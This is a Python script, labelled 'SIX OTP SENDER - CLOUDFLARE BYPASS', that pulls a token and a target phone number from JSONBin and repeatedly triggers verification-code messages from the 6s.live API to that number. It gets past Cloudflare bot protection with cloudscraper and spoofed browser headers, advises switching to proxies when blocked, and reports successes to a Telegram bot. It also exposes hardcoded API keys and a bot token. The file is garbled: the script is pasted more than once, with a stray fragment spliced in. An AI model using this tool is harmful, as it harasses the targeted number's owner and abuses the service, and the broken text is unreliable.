import requests
import json
import time
import os
import random
import cloudscraper  # Cloudflare bypass এর জন্য
from urllib.parse import urlparse, parse_qs

BOLD = '[1m'
R = '[91m'
G = '[92m'
Y = '[93m'
B = '[94m'
D = '[0m'

BIN_ID = '69454f7643b1c97be9f91a85'
API_KEY = '$2a$10$TWuZ1cfV8BVaIKzzS2BGS.e56gTvpvpTAtDJz2S./2atXCKI2eIv2'

def fetch_data():
    """JSONBin থেকে ডাটা নেয়া"""
    try:
        url = f"https://api.jsonbin.io/v3/b/{BIN_ID}/latest"
        headers = {"X-Master-Key": API_KEY}
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json().get("record", {})
            token = data.get("token", "").strip()
            number = str(data.get("number", "")).strip()
            
            if token and number:
                print(f"{G}✓ Token loaded{D}")
                print(f"{G}✓ Number: {number}{D}")
                return token, number
    except Exception as e:
        print(f"{R}✗ Error: {e}{D}")
    return None, None

def bypass_cloudflare():
    """Cloudflare challenge bypass করা"""
    print(f"{Y}🛡️ Cloudflare bypass চেষ্টা করা হচ্ছে...{D}")
    
    try:
        # Cloudscraper ব্যবহার করে (Cloudflare bypass করার জন্য)
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )
        
        # প্রথমে মূল পেজ ভিজিট করা
        print(f"{B}1. মূল সাইট লোড করা হচ্ছে...{D}")
        response = scraper.get(
            "https://6s.live/bd/en/member/profile",
            timeout=30
        )
        
        if response.status_code == 200:
            print(f"{G}✓ সাইট লোডেড: {len(response.text)} bytes{D}")
            
            # Cookies সংগ্রহ করা
            cookies = scraper.cookies.get_dict()
            print(f"{G}✓ Cookies collected: {len(cookies)} items{D}")
            
            # User-Agent দেখা
            user_agent = scraper.headers.get('User-Agent', '')
            print(f"{G}✓ User-Agent: {user_agent[:50]}...{D}")
            
            return scraper, cookies, user_agent
        else:
            print(f"{R}✗ সাইট লোড ব্যর্থ: {response.status_code}{D}")
            return None, None, None
            
    except Exception as e:
        print(f"{R}✗ Cloudflare bypass error: {e}{D}")
        return None, None, None

def get_authenticated_session(token):
    """Authenticated session তৈরি করা"""
    print(f"{Y}🔐 Authenticated session তৈরি করা হচ্ছে...{D}")
    
    session = requests.Session()
    
    # ব্রাউজারের মতো হেডার্স সেট করা
    session.headers.update({
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'authorization': f'Bearer {token}',
        'content-type': 'application/json',
        'origin': 'https://6s.live',
        'referer': 'https://6s.live/bd/en/member/profile',
        'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'x-internal-request': '61405202',
        'x-requested-with': 'XMLHttpRequest'
    })
    
    # প্রথমে একটি GET request পাঠানো (session establish)
    try:
        print(f"{B}2. Session establish করা হচ্ছে...{D}")
        test_response = session.get(
            "https://6s.live/api/bt/v1/user/profile",
            timeout=15
        )
        
        if test_response.status_code == 200:
            print(f"{G}✓ Session established{D}")
            return session
        else:
            print(f"{Y}⚠️ Session test: {test_response.status_code}{D}")
            return session
    except:
        print(f"{Y}⚠️ Session test skipped{D}")
        return session

def send_otp_with_session(session, number, attempt):
    """Session ব্যবহার করে OTP পাঠানো"""
    
    payload = {
        'languageTypeId': 1,
        'currencyTypeId': 8,
        'contactTypeId': 2,
        'domain': '6s.live',
        'receiver': str(number),
        'callingCode': '880'
    }
    
    print(f"{B}3. OTP পাঠানো হচ্ছে...{D}")
    print(f"{B}   📱 To: {number}{D}")
    print(f"{B}   📦 Payload: {json.dumps(payload)}{D}")
    
    try:
        response = session.post(
            'https://6s.live/api/bt/v1/user/getVerifyCodeByContactType',
            json=payload,
            timeout=20
        )
        
        print(f"{B}   📊 Status: {response.status_code}{D}")
        
        if response.status_code == 200:
            try:
                return response.json(), response.status_code
            except:
                return {'raw': response.text}, response.status_code
        else:
            return {'error': f'HTTP {response.status_code}', 'text': response.text[:200]}, response.status_code
            
    except Exception as e:
        return {'error': str(e)}, 0

def send_otp_direct(token, number):
    """Direct API call (যদি session কাজ না করে)"""
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'authorization': f'Bearer {token}',
        'content-type': 'application/json',
        'referer': 'https://6s.live/bd/en/member/profile',
        'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'x-internal-request': '61405202',
        'origin': 'https://6s.live'
    }
    
    payload = {
        'languageTypeId': 1,
        'currencyTypeId': 8,
        'contactTypeId': 2,
        'domain': '6s.live',
        'receiver': str(number),
        'callingCode': '880'
    }
    
    try:
        response = requests.post(
            'https://6s.live/api/bt/v1/user/getVerifyCodeByContactType',
            headers=headers,
            json=payload,
            timeout=15
        )
        
        if response.status_code == 200:
            return response.json(), response.status_code
        else:
            return {'error': f'HTTP {response.status_code}'}, response.status_code
    except Exception as e:
        return {'error': str(e)}, 0

def send_telegram_notification(message):
    """টেলিগ্রাম নোটিফিকেশন"""
    try:
        BOT_TOKEN = '8345339682:AAFs60FHY__L2dSKx47sM4IX8nfyPFTACkE'
        CHAT_ID = '-5099546793'
        requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            json={'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'},
            timeout=5
        )
        return True
    except:
        return False

def main():
    os.system('clear')
    
    print(f"{BOLD}{B}" + "="*75)
    print(f"{BOLD}{G}           SIX OTP SENDER - CLOUDFLARE BYPASS")
    print(f"{BOLD}{B}" + "="*75 + f"{D}")
    
    # টুল স্যুইচ চেক
    try:
        switch = requests.get(
            'https://raw.githubusercontent.com/havecode17/dg/refs/heads/main/switch',
            timeout=5
        ).text
        if 'OFF' in switch:
            print(f"{R}✗ Tool disabled by admin!{D}")
            return
        print(f"{G}✓ Tool is enabled{D}")
    except:
        print(f"{Y}⚠️ Could not check switch{D}")
    
    # ডাটা লোড
    token, number = fetch_data()
    if not token or not number:
        print(f"{R}✗ Failed to load data{D}")
        return
    
    print(f"\n{B}" + "-"*55)
    print(f"{B}🎯 Target Number: {G}{number}{D}")
    print(f"{B}🔑 Token: {G}{token[:50]}...{D}")
    print(f"{B}" + "-"*55 + f"{D}")
    
    # প্রথমে Cloudflare bypass চেষ্টা
    scraper, cookies, user_agent = bypass_cloudflare()
    
    attempt = 1
    
    while True:
        print(f"\n{Y}" + "="*60)
        print(f"   Attempt #{attempt}")
        print("="*60 + f"{D}")
        
        input(f"{BOLD}{Y}👉 Press ENTER to send OTP: {D}")
        
        print(f"\n{B}[Method 1] Session-based request...{D}")
        
        # Method 1: Authenticated session
        session = get_authenticated_session(token)
        if session:
            result, status = send_otp_with_session(session, number, attempt)
        else:
            result, status = {'error': 'Session creation failed'}, 0
        
        # যদি Method 1 কাজ না করে
        if status != 200 or 'error' in result:
            print(f"\n{B}[Method 2] Direct API call...{D}")
            result, status = send_otp_direct(token, number)
        
        # রেসপন্স প্রসেসিং
        print(f"\n{B}📄 Response Analysis:{D}")
        
        if status == 200:
            print(f"{G}✓ API Call Successful (200 OK){D}")
            
            # JSON ডাটা ডিসপ্লে
            if isinstance(result, dict):
                for key, value in result.items():
                    if key not in ['raw', 'error']:
                        print(f"   {B}{key}: {Y}{value}{D}")
                
                api_status = result.get('status')
                message = result.get('message', '')
                
                if api_status == '000000':
                    print(f"\n{G}🎉 SUCCESS! OTP sent successfully!{D}")
                    print(f"{G}⏰ Code valid for 5 minutes{D}")
                    
                    # টেলিগ্রাম নোটিফিকেশন
                    tg_msg = f"✅ OTP SENT SUCCESSFULLY!\n📱 Number: {number}\n🔢 Status: {api_status}"
                    if send_telegram_notification(tg_msg):
                        print(f"{G}📨 Telegram notification sent{D}")
                    else:
                        print(f"{Y}⚠️ Telegram notification failed{D}")
                        
                elif api_status == 'FS9997':
                    print(f"\n{R}✗ This number is already registered{D}")
                    
                elif api_status == 'FS9998':
                    print(f"\n{R}✗ Failed to send OTP (FS9998){D}")
                    print(f"{Y}Possible: Rate limit or server issue{D}")
                    
                elif api_status == 'S0001':
                    print(f"\n{R}✗ Session expired, please login again{D}")
                    
                elif api_status:
                    print(f"\n{Y}⚠️ Unknown status: {api_status}{D}")
                    
            else:
                print(f"{Y}⚠️ Response is not JSON{D}")
                print(f"{Y}Raw: {str(result)[:200]}...{D}")
                
        elif status == 403:
            print(f"\n{R}🚫 CLOUDFLARE CHALLENGE BLOCKED!{D}")
            print(f"{Y}This means:{D}")
            print(f"1. {B}Cloudflare reCAPTCHA showing{D}")
            print(f"2. {B}Need human verification{D}")
            print(f"3. {B}IP might be flagged{D}")
            
            print(f"\n{Y}🛠️ Solutions:{D}")
            print(f"1. {B}Wait 15-30 minutes{D}")
            print(f"2. {B}Change IP address (VPN/Proxy){D}")
            print(f"3. {B}Use residential proxy{D}")
            print(f"4. {B}Try from different network{D}")
            
        elif status == 429:
            print(f"\n{R}⚡ RATE LIMIT EXCEEDED!{D}")
            print(f"{Y}Wait 30-60 minutes before retrying{D}")
            
        elif 'error' in result:
            print(f"\n{R}✗ Error: {result['error']}{D}")
        else:
            print(f"\n{R}✗ Unknown error, status: {status}{D}")
        
        # অপেক্ষা
        wait_time = random.randint(20, 40) if status == 429 else random.randint(10, 20)
        print(f"\n{B}⏳ Next attempt in {wait_time} seconds...{D}")
        
        for i in range(wait_time, 0, -1):
            print(f"\r{B}Waiting {i} seconds...{D}", end="", flush=True)
            time.sleep(1)
        print()
        
        attempt += 1

if __name__ == "__main__":
    try:
        # প্রথমে cloudscraper ইনস্টল করা আছে কিনা চেক
        try:
            import cloudscraper
        except ImportError:
            print(f"{R}⚠️ cloudscraper module not installed!{D}")
            print(f"{Y}Installing required modules...{D}")
            os.system("pip install cloudscraper")
            import cloudscraper
        
        main()
    except KeyboardInterrupt:
        print(f"\n\n{R}✗ Stopped by user{D}")
    except Exception as e:
        print(f"\n{R}💥 Fatal error: {e}{D}")        
        print(f"{B}   📊 Status: {response.status_code}{D}")
        
        if response.status_code == 200:
            try:
                return response.json(), response.status_code
            except:
                return {'raw': response.text}, response.status_code
        else:
            return {'error': f'HTTP {response.status_code}', 'text': response.text[:200]}, response.status_code
            
    except Exception as e:
        return {'error': str(e)}, 0

def send_otp_direct(token, number):
    """Direct API call (যদি session কাজ না করে)"""
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'authorization': f'Bearer {token}',
        'content-type': 'application/json',
        'referer': 'https://6s.live/bd/en/member/profile',
        'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'x-internal-request': '61405202',
        'origin': 'https://6s.live'
    }
    
    payload = {
        'languageTypeId': 1,
        'currencyTypeId': 8,
        'contactTypeId': 2,
        'domain': '6s.live',
        'receiver': str(number),
        'callingCode': '880'
    }
    
    try:
        response = requests.post(
            'https://6s.live/api/bt/v1/user/getVerifyCodeByContactType',
            headers=headers,
            json=payload,
            timeout=15
        )
        
        if response.status_code == 200:
            return response.json(), response.status_code
        else:
            return {'error': f'HTTP {response.status_code}'}, response.status_code
    except Exception as e:
        return {'error': str(e)}, 0

def send_telegram_notification(message):
    """টেলিগ্রাম নোটিফিকেশন"""
    try:
        BOT_TOKEN = '8345339682:AAFs60FHY__L2dSKx47sM4IX8nfyPFTACkE'
        CHAT_ID = '-5099546793'
        requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            json={'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'},
            timeout=5
        )
        return True
    except:
        return False

def main():
    os.system('clear')
    
    print(f"{BOLD}{B}" + "="*75)
    print(f"{BOLD}{G}           SIX OTP SENDER - CLOUDFLARE BYPASS")
    print(f"{BOLD}{B}" + "="*75 + f"{D}")
    
    # টুল স্যুইচ চেক
    try:
        switch = requests.get(
            'https://raw.githubusercontent.com/havecode17/dg/refs/heads/main/switch',
            timeout=5
        ).text
        if 'OFF' in switch:
            print(f"{R}✗ Tool disabled by admin!{D}")
            return
        print(f"{G}✓ Tool is enabled{D}")
    except:
        print(f"{Y}⚠️ Could not check switch{D}")
    
    # ডাটা লোড
    token, number = fetch_data()
    if not token or not number:
        print(f"{R}✗ Failed to load data{D}")
        return
    
    print(f"\n{B}" + "-"*55)
    print(f"{B}🎯 Target Number: {G}{number}{D}")
    print(f"{B}🔑 Token: {G}{token[:50]}...{D}")
    print(f"{B}" + "-"*55 + f"{D}")
    
    # প্রথমে Cloudflare bypass চেষ্টা
    scraper, cookies, user_agent = bypass_cloudflare()
    
    attempt = 1
    
    while True:
        print(f"\n{Y}" + "="*60)
        print(f"   Attempt #{attempt}")
        print("="*60 + f"{D}")
        
        input(f"{BOLD}{Y}👉 Press ENTER to send OTP: {D}")
        
        print(f"\n{B}[Method 1] Session-based request...{D}")
        
        # Method 1: Authenticated session
        session = get_authenticated_session(token)
        if session:
            result, status = send_otp_with_session(session, number, attempt)
        else:
            result, status = {'error': 'Session creation failed'}, 0
        
        # যদি Method 1 কাজ না করে
        if status != 200 or 'error' in result:
            print(f"\n{B}[Method 2] Direct API call...{D}")
            result, status = send_otp_direct(token, number)
        
        # রেসপন্স প্রসেসিং
        print(f"\n{B}📄 Response Analysis:{D}")
        
        if status == 200:
            print(f"{G}✓ API Call Successful (200 OK){D}")
            
            # JSON ডাটা ডিসপ্লে
            if isinstance(result, dict):
                for key, value in result.items():
                    if key not in ['raw', 'error']:
                        print(f"   {B}{key}: {Y}{value}{D}")
                
                api_status = result.get('status')
                message = result.get('message', '')
                
                if api_status == '000000':
                    print(f"\n{G}🎉 SUCCESS! OTP sent successfully!{D}")
                    print(f"{G}⏰ Code valid for 5 minutes{D}")
                    
                    # টেলিগ্রাম নোটিফিকেশন
                    tg_msg = f"✅ OTP SENT SUCCESSFULLY!\n📱 Number: {number}\n🔢 Status: {api_status}"
                    if send_telegram_notification(tg_msg):
                        print(f"{G}📨 Telegram notification sent{D}")
                    else:
                        print(f"{Y}⚠️ Telegram notification failed{D}")
                        
                elif api_status == 'FS9997':
                    print(f"\n{R}✗ This number is already registered{D}")
                    
                elif api_status == 'FS9998':
                    print(f"\n{R}✗ Failed to send OTP (FS9998){D}")
                    print(f"{Y}Possible: Rate limit or server issue{D}")
                    
                elif api_status == 'S0001':
                    print(f"\n{R}✗ Session expired, please login again{D}")
                    
                elif api_status:
                    print(f"\n{Y}⚠️ Unknown status: {api_status}{D}")
                    
            else:
                print(f"{Y}⚠️ Response is not JSON{D}")
                print(f"{Y}Raw: {str(result)[:200]}...{D}")
                
        elif status == 403:
            print(f"\n{R}🚫 CLOUDFLARE CHALLENGE BLOCKED!{D}")
            print(f"{Y}This means:{D}")
            print(f"1. {B}Cloudflare reCAPTCHA showing{D}")
            print(f"2. {B}Need human verification{D}")
            print(f"3. {B}IP might be flagged{D}")
            
            print(f"\n{Y}🛠️ Solutions:{D}")
            print(f"1. {B}Wait 15-30 minutes{D}")
            print(f"2. {B}Change IP address (VPN/Proxy){D}")
            print(f"3. {B}Use residential proxy{D}")
            print(f"4. {B}Try from different network{D}")
            
        elif status == 429:
            print(f"\n{R}⚡ RATE LIMIT EXCEEDED!{D}")
            print(f"{Y}Wait 30-60 minutes before retrying{D}")
            
        elif 'error' in result:
            print(f"\n{R}✗ Error: {result['error']}{D}")
        else:
            print(f"\n{R}✗ Unknown error, status: {status}{D}")
        
        # অপেক্ষা
        wait_time = random.randint(20, 40) if status == 429 else random.randint(10, 20)
        print(f"\n{B}⏳ Next attempt in {wait_time} seconds...{D}")
        
        for i in range(wait_time, 0, -1):
            print(f"\r{B}Waiting {i} seconds...{D}", end="", flush=True)
            time.sleep(1)
        print()
        
        attempt += 1

if __name__ == "__main__":
    try:
        # প্রথমে cloudscraper ইনস্টল করা আছে কিনা চেক
        try:
            import cloudscraper
        except ImportError:
            print(f"{R}⚠️ cloudscraper module not installed!{D}")
            print(f"{Y}Installing required modules...{D}")
            os.system("pip install cloudscraper")
            import cloudscraper
        
        main()
    except KeyboardInterrupt:
        print(f"\n\n{R}✗ Stopped by user{D}")
    except Exception as e:
        print(f"\n{R}💥 Fatal error: {e}{D}")import requests
import json
import time
import os
import random
import cloudscraper  # Cloudflare bypass এর জন্য
from urllib.parse import urlparse, parse_qs

BOLD = '[1m'
R = '[91m'
G = '[92m'
Y = '[93m'
B = '[94m'
D = '[0m'

BIN_ID = '69454f7643b1c97be9f91a85'
API_KEY = '$2a$10$TWuZ1cfV8BVaIKzzS2BGS.e56gTvpvpTAtDJz2S./2atXCKI2eIv2'

def fetch_data():
    """JSONBin থেকে ডাটা নেয়া"""
    try:
        url = f"https://api.jsonbin.io/v3/b/{BIN_ID}/latest"
        headers = {"X-Master-Key": API_KEY}
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json().get("record", {})
            token = data.get("token", "").strip()
            number = str(data.get("number", "")).strip()
            
            if token and number:
                print(f"{G}✓ Token loaded{D}")
                print(f"{G}✓ Number: {number}{D}")
                return token, number
    except Exception as e:
        print(f"{R}✗ Error: {e}{D}")
    return None, None

def bypass_cloudflare():
    """Cloudflare challenge bypass করা"""
    print(f"{Y}🛡️ Cloudflare bypass চেষ্টা করা হচ্ছে...{D}")
    
    try:
        # Cloudscraper ব্যবহার করে (Cloudflare bypass করার জন্য)
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )
        
        # প্রথমে মূল পেজ ভিজিট করা
        print(f"{B}1. মূল সাইট লোড করা হচ্ছে...{D}")
        response = scraper.get(
            "https://6s.live/bd/en/member/profile",
            timeout=30
        )
        
        if response.status_code == 200:
            print(f"{G}✓ সাইট লোডেড: {len(response.text)} bytes{D}")
            
            # Cookies সংগ্রহ করা
            cookies = scraper.cookies.get_dict()
            print(f"{G}✓ Cookies collected: {len(cookies)} items{D}")
            
            # User-Agent দেখা
            user_agent = scraper.headers.get('User-Agent', '')
            print(f"{G}✓ User-Agent: {user_agent[:50]}...{D}")
            
            return scraper, cookies, user_agent
        else:
            print(f"{R}✗ সাইট লোড ব্যর্থ: {response.status_code}{D}")
            return None, None, None
            
    except Exception as e:
        print(f"{R}✗ Cloudflare bypass error: {e}{D}")
        return None, None, None

def get_authenticated_session(token):
    """Authenticated session তৈরি করা"""
    print(f"{Y}🔐 Authenticated session তৈরি করা হচ্ছে...{D}")
    
    session = requests.Session()
    
    # ব্রাউজারের মতো হেডার্স সেট করা
    session.headers.update({
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'authorization': f'Bearer {token}',
        'content-type': 'application/json',
        'origin': 'https://6s.live',
        'referer': 'https://6s.live/bd/en/member/profile',
        'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'x-internal-request': '61405202',
        'x-requested-with': 'XMLHttpRequest'
    })
    
    # প্রথমে একটি GET request পাঠানো (session establish)
    try:
        print(f"{B}2. Session establish করা হচ্ছে...{D}")
        test_response = session.get(
            "https://6s.live/api/bt/v1/user/profile",
            timeout=15
        )
        
        if test_response.status_code == 200:
            print(f"{G}✓ Session established{D}")
            return session
        else:
            print(f"{Y}⚠️ Session test: {test_response.status_code}{D}")
            return session
    except:
        print(f"{Y}⚠️ Session test skipped{D}")
        return session

def send_otp_with_session(session, number, attempt):
    """Session ব্যবহার করে OTP পাঠানো"""
    
    payload = {
        'languageTypeId': 1,
        'currencyTypeId': 8,
        'contactTypeId': 2,
        'domain': '6s.live',
        'receiver': str(number),
        'callingCode': '880'
    }
    
    print(f"{B}3. OTP পাঠানো হচ্ছে...{D}")
    print(f"{B}   📱 To: {number}{D}")
    print(f"{B}   📦 Payload: {json.dumps(payload)}{D}")
    
    try:
        response = session.post(
            'https://6s.live/api/bt/v1/user/getVerifyCodeByContactType',
            json=payload,
            timeout=20
        )
        
        print(f"{B}   📊 Status: {response.status_code}{D}")
        
        if response.status_code == 200:
            try:
                return response.json(), response.status_code
            except:
                return {'raw': response.text}, response.status_code
        else:
            return {'error': f'HTTP {response.status_code}', 'text': response.text[:200]}, response.status_code
            
    except Exception as e:
        return {'error': str(e)}, 0

def send_otp_direct(token, number):
    """Direct API call (যদি session কাজ না করে)"""
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'authorization': f'Bearer {token}',
        'content-type': 'application/json',
        'referer': 'https://6s.live/bd/en/member/profile',
        'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'x-internal-request': '61405202',
        'origin': 'https://6s.live'
    }
    
    payload = {
        'languageTypeId': 1,
        'currencyTypeId': 8,
        'contactTypeId': 2,
        'domain': '6s.live',
        'receiver': str(number),
        'callingCode': '880'
    }
    
    try:
        response = requests.post(
            'https://6s.live/api/bt/v1/user/getVerifyCodeByContactType',
            headers=headers,
            json=payload,
            timeout=15
        )
        
        if response.status_code == 200:
            return response.json(), response.status_code
        else:
            return {'error': f'HTTP {response.status_code}'}, response.status_code
    except Exception as e:
        return {'error': str(e)}, 0

def send_telegram_notification(message):
    """টেলিগ্রাম নোটিফিকেশন"""
    try:
        BOT_TOKEN = '8345339682:AAFs60FHY__L2dSKx47sM4IX8nfyPFTACkE'
        CHAT_ID = '-5099546793'
        requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            json={'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'},
            timeout=5
        )
        return True
    except:
        return False

def main():
    os.system('clear')
    
    print(f"{BOLD}{B}" + "="*75)
    print(f"{BOLD}{G}           SIX OTP SENDER - CLOUDFLARE BYPASS")
    print(f"{BOLD}{B}" + "="*75 + f"{D}")
    
    # টুল স্যুইচ চেক
    try:
        switch = requests.get(
            'https://raw.githubusercontent.com/havecode17/dg/refs/heads/main/switch',
            timeout=5
        ).text
        if 'OFF' in switch:
            print(f"{R}✗ Tool disabled by admin!{D}")
            return
        print(f"{G}✓ Tool is enabled{D}")
    except:
        print(f"{Y}⚠️ Could not check switch{D}")
    
    # ডাটা লোড
    token, number = fetch_data()
    if not token or not number:
        print(f"{R}✗ Failed to load data{D}")
        return
    
    print(f"\n{B}" + "-"*55)
    print(f"{B}🎯 Target Number: {G}{number}{D}")
    print(f"{B}🔑 Token: {G}{token[:50]}...{D}")
    print(f"{B}" + "-"*55 + f"{D}")
    
    # প্রথমে Cloudflare bypass চেষ্টা
    scraper, cookies, user_agent = bypass_cloudflare()
    
    attempt = 1
    
    while True:
        print(f"\n{Y}" + "="*60)
        print(f"   Attempt #{attempt}")
        print("="*60 + f"{D}")
        
        input(f"{BOLD}{Y}👉 Press ENTER to send OTP: {D}")
        
        print(f"\n{B}[Method 1] Session-based request...{D}")
        
        # Method 1: Authenticated session
        session = get_authenticated_session(token)
        if session:
            result, status = send_otp_with_session(session, number, attempt)
        else:
            result, status = {'error': 'Session creation failed'}, 0
        
        # যদি Method 1 কাজ না করে
        if status != 200 or 'error' in result:
            print(f"\n{B}[Method 2] Direct API call...{D}")
            result, status = send_otp_direct(token, number)
        
        # রেসপন্স প্রসেসিং
        print(f"\n{B}📄 Response Analysis:{D}")
        
        if status == 200:
            print(f"{G}✓ API Call Successful (200 OK){D}")
            
            # JSON ডাটা ডিসপ্লে
            if isinstance(result, dict):
                for key, value in result.items():
                    if key not in ['raw', 'error']:
                        print(f"   {B}{key}: {Y}{value}{D}")
                
                api_status = result.get('status')
                message = result.get('message', '')
                
                if api_status == '000000':
                    print(f"\n{G}🎉 SUCCESS! OTP sent successfully!{D}")
                    print(f"{G}⏰ Code valid for 5 minutes{D}")
                    
                    # টেলিগ্রাম নোটিফিকেশন
                    tg_msg = f"✅ OTP SENT SUCCESSFULLY!\n📱 Number: {number}\n🔢 Status: {api_status}"
                    if send_telegram_notification(tg_msg):
                        print(f"{G}📨 Telegram notification sent{D}")
                    else:
                        print(f"{Y}⚠️ Telegram notification failed{D}")
                        
                elif api_status == 'FS9997':
                    print(f"\n{R}✗ This number is already registered{D}")
                    
                elif api_status == 'FS9998':
                    print(f"\n{R}✗ Failed to send OTP (FS9998){D}")
                    print(f"{Y}Possible: Rate limit or server issue{D}")
                    
                elif api_status == 'S0001':
                    print(f"\n{R}✗ Session expired, please login again{D}")
                    
                elif api_status:
                    print(f"\n{Y}⚠️ Unknown status: {api_status}{D}")
                    
            else:
                print(f"{Y}⚠️ Response is not JSON{D}")
                print(f"{Y}Raw: {str(result)[:200]}...{D}")
                
        elif status == 403:
            print(f"\n{R}🚫 CLOUDFLARE CHALLENGE BLOCKED!{D}")
            print(f"{Y}This means:{D}")
            print(f"1. {B}Cloudflare reCAPTCHA showing{D}")
            print(f"2. {B}Need human verification{D}")
            print(f"3. {B}IP might be flagged{D}")
            
            print(f"\n{Y}🛠️ Solutions:{D}")
            print(f"1. {B}Wait 15-30 minutes{D}")
            print(f"2. {B}Change IP address (VPN/Proxy){D}")
            print(f"3. {B}Use residential proxy{D}")
            print(f"4. {B}Try from different network{D}")
            
        elif status == 429:
            print(f"\n{R}⚡ RATE LIMIT EXCEEDED!{D}")
            print(f"{Y}Wait 30-60 minutes before retrying{D}")
            
        elif 'error' in result:
            print(f"\n{R}✗ Error: {result['error']}{D}")
        else:
            print(f"\n{R}✗ Unknown error, status: {status}{D}")
        
        # অপেক্ষা
        wait_time = random.randint(20, 40) if status == 429 else random.randint(10, 20)
        print(f"\n{B}⏳ Next attempt in {wait_time} seconds...{D}")
        
        for i in range(wait_time, 0, -1):
            print(f"\r{B}Waiting {i} seconds...{D}", end="", flush=True)
            time.sleep(1)
        print()
        
        attempt += 1

if __name__ == "__main__":
    try:
        # প্রথমে cloudscraper ইনস্টল করা আছে কিনা চেক
        try:
            import cloudscraper
        except ImportError:
            print(f"{R}⚠️ cloudscraper module not installed!{D}")
            print(f"{Y}Installing required modules...{D}")
            os.system("pip install cloudscraper")
            import cloudscraper
        
        main()
    except KeyboardInterrupt:
        print(f"\n\n{R}✗ Stopped by user{D}")
    except Exception as e:
        print(f"\n{R}💥 Fatal error: {e}{D}")

